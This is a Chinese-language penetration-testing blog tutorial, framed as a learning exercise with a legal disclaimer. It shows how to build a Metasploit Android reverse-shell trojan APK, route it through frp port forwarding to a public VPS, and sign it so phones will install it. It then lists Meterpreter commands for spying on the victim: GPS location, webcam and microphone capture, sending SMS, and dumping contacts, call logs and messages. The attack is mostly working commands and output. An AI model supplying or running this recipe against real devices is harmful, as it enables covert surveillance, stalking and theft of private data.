![](https://image.3001.net/images/20200823/1598145897.jpg!small)**声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！**

本文旨在激发像我一样自学渗透测试的小白对于使用metasploit这门基础工具的兴趣，metasploit的各种骚使用网上很多，感兴趣的可以自己去了解学习，只有自己真正感兴趣，多去了解和实践，才会有提升。本文我们就来讲一下通过metasploit控制手机的简单案例。

## Android系统下使用的Metasploit模块

如下图，可以看到有这几种可以在Android下使用的payload：

![](https://image.3001.net/images/20200823/1598152904.png!small)

## 端口映射方案

如果我们的手机与攻击者所使用的计算机处在同一局域网，受害者的手机可以直接访问到攻击者的电脑，也就不需要端口映射了。可是现实中，绝大多数情况是，受害者的手机位于外网或者与攻击者处于不同的内网，而攻击者的电脑处于令一个内网环境，此时，受害者的手机无法直接访问到攻击者的电脑，那么就需要进行端口映射了，即将攻击者的端口映射到位于公网的vps上面去，这样，受害者的手机通过访问公网vps就可以间接的访问处于内网的攻击者的电脑。

更简单的一个解决方法：既然都有vps了，为啥不直接用vps当攻击机呢？可以直接在vps上面安装metasploit，生成木马并直接控制受害者的手机，这多简单。但这里我们还是用端口映射的方法。

### frp

我们先用frp工具来实现端口映射，利用处在内网的攻击机kali实现对处在外网的Android机器的入侵。

 **实验环境：**

  * 目标Android设备

  * 公网vps（centos）

  * 内网攻击机kali

 **主思路是：**

  * 公网vps运行frp server

  * 本地kali运行frp client

  * 将kali本地端口映射到公网vps

 **1\. VPS 服务端：**

将vps作为frp服务端，执行`./frps -c ./frps.ini`，服务端的配置 frps.ini 如下：

    
    
    [common]
    bind_port = 7000   # 这是默认的，改不改皆可

![](https://image.3001.net/images/20200823/1598153111.png!small)

 **2\. 客户端：**

将内网攻击机kali作为frp客户端，客户端的配置 frps.ini 如下：

    
    
    [common]
    server_addr = 39.xxx.xxx.210  # 这里是公网vps的ip
    server_port = 7000          # 这里的端口要跟服务端的一样
    
    [msf]
    type = tcp
    local_ip = 127.0.0.1        
    local_port = 4444          # 将到达frp服务器的数据转发给本地的4444端口
    remote_port = 2333         # 服务端的2333端口转发给本地

 **客户端通过vps的IP和7000监听端口建立连接，把公网的2333端口数据传递给本地的4444端口。**

配置完，执行`./frpc -c ./frpc.ini`启动客户端：

![](https://image.3001.net/images/20200823/1598153174.png!small)到这里frp就配置完了，接下来就是要生成木马了。

## Metasploit生成木马

用Metasploit生成载有恶意Payload的Android的apk。在Kali Linux里面打开一个新的窗口输入：

    
    
    msfvenom -p android/meterpreter/reverse_tcp LHOST=39.xxx.xxx.210(vps公网ip) LPORT=2333(公网) R > shell.apk

![](https://image.3001.net/images/20200823/1598153244.png!small)

## 为apk应用签名

我们已经成功创建了Android格式（APK）文件的有效载荷。但是，现在一般Android的移动设备不允许安装没有适当签名证书的应用程序。
Android设备只安装带有签署文件的APK。我们可以使用如下工具进行手动签名：

    
    
    Keytool
    JARsigner
    zipalign

这3个软件，Kali中内置了前2个，第3个需要安装（在新版kali中，JARsigner也需要自己安装apt-get install
openjdk-13-jdk-headless）

 **第一步** ： **使用keytool生成一个key文件。** 会让你输入该key的名称、单位、地址等等信息，最终生成一个key文件

    
    
    keytool -genkey -v -keystore my-release-key.Keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000

![](https://image.3001.net/images/20200823/1598153319.png!small)

上面问你的东西随便填就行，但是要注意，最后不要输入yes要输y，不然会一直询问。

如下图，生成一个key文件：

![](https://image.3001.net/images/20200823/1598153345.png!small)
**第二步：使用该key文件配合JARsigner为APK签名**

    
    
    jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore shell.apk alias_name

![](https://image.3001.net/images/20200823/1598153378.png!small)

 **第三步：然后使用JARsigner验证签名**

    
    
    jarsigner -verify -verbose -certs shell.apk

![](https://image.3001.net/images/20200823/1598153405.png!small)![](https://image.3001.net/images/20200823/1598153427.png!small)到此为止，就完成了签名过程，此shell.apk就可以在Android中使用了。

## 开启Metasploit进行监听

使用metasploit监听本地接受数据的端口

    
    
    msfconsole  
    use exploit/multi/handler  
    set payload android/meterpreter/reverse_tcp   
    set LHOST 127.0.0.1  
    set LPORT 4444  
    exploit

然后将载有payload的APK发送到手机上安装并启动，此时，msf上面就可以得到手机的一个session了：

![](https://image.3001.net/images/20200823/1598153474.png!small)

这里，有的手机得到的session一会儿自动断开，不知道为什么，我自己想了个解决办法是：刚一获得session就马上执行 webcam_stream
开启远程视频，之后断开视频就可以了，session就稳定了，不会再断开了，不知道为什么！

在我们获取了目标Android手机的Meterpreter权限之后，我们可以执行如下命令进行后渗透攻击

## 后渗透攻击

 **查看手机是否root过**

    
    
    check_root

![](https://image.3001.net/images/20200823/1598153542.png!small)

 **控制目标手机发送短信**

    
    
    send_sms -d 某个手机号码 -t "hello"

 **查看系统信息**

    
    
    sysinfo

![](https://image.3001.net/images/20200823/1598153591.png!small) **对手机进行定位**

    
    
    wlan_geolocate       // 使用WLAN信息获取当前地理位置
    geolocate            // 利用地理定位(GPS)获取当前LAT

![](https://image.3001.net/images/20200823/1598153622.png!small)

此命令会输出手机的经纬度，我们根据这个经纬度就可以知道手机的具体位置；还有一个网址，打开网址就会显示手机在谷歌地图中的位置。但是这个网址要科学上网，所以我们可以直接在
**谷歌地球** 上定位这个经纬度：

![](https://image.3001.net/images/20200823/1598153661.png!small)准确度没得说了，精确到楼号。（以上经纬度为geolocate获取）

 **调用手机摄像头**

    
    
    webcam_list      // 列出网络摄像头
    webcam_snap 1/2
    webcam_chat      // 开始视频聊天
    webcam_snap      // 从指定的摄像头获取快照
    webcam_stream -i 1      // 从指定的网络摄像头播放视频流

![](https://image.3001.net/images/20200823/1598153718.png!small)![](https://image.3001.net/images/20200823/1598153738.png!small)

 **调用麦克风**

    
    
    record_mic -d x      // 从默认麦克风录制音频为X秒

此命令默认录制默认麦克风录制1秒钟的音频，并将尝试不带精度的参数来播放捕获的音频wav文件。

 **获取通讯记录信息**

    
    
    dump_calllog      // 下载目标手机上的通话记录  
    dump_contacts     // 获取联系人列表  
    dump_sms         // 获取短信

![](https://image.3001.net/images/20200823/1598153780.png!small)

如上图，将通讯记录，联系人列表和短信都保存到了攻击者本地文件中了

来个比较有意思的。现在让我远程 **强制修改我手机的壁图案** 。继续输入命令如下：

    
    
    msf > use post/multi/manage/set_wallpaper
    msf post (set_wallpaper)>set WALLPAPER_FILE  /root/5.jpg
    msf post (set_wallpaper)>set session 1
    msf post (set_wallpaper)>exploit

5.jpg如下：

![](https://image.3001.net/images/20200823/1598153811.png!small)执行模块并成功更换：

![](https://image.3001.net/images/20200823/1598153837.png!small)![](https://image.3001.net/images/20200823/1598153854.png!small)更多命令如下：

    
    
    execute 执行一个命令 
    getuid 获取当前运行的用户 
    localtime 显示目标系统的本地日期和时间 
    pgrep 按名称筛选进程 
    ps 列出正在运行的进程
    
    用户界面命令
    =============================== 
    screenshare  实时监视远程用户的桌面
    screenshot  抓取交互式桌面的屏幕截图
    
    音频输出命令
    =============================
    play       在目标系统上播放波形音频文件（.wav）
    
    应用程序控制器命令
    ===============================
    app_install   请求安装apk文件
    app_list     列出设备中已安装的应用程序
    app_run      启动包名称的主活动
    app_uninstall 请求卸载apk文件

## Ending......

从下节开始，我们将讲解内网渗透测试中的权限提升思路与方法。

![](https://image.3001.net/images/20200823/1598154981.jpg!small)

个人博客：<https://whoamianony.top/>

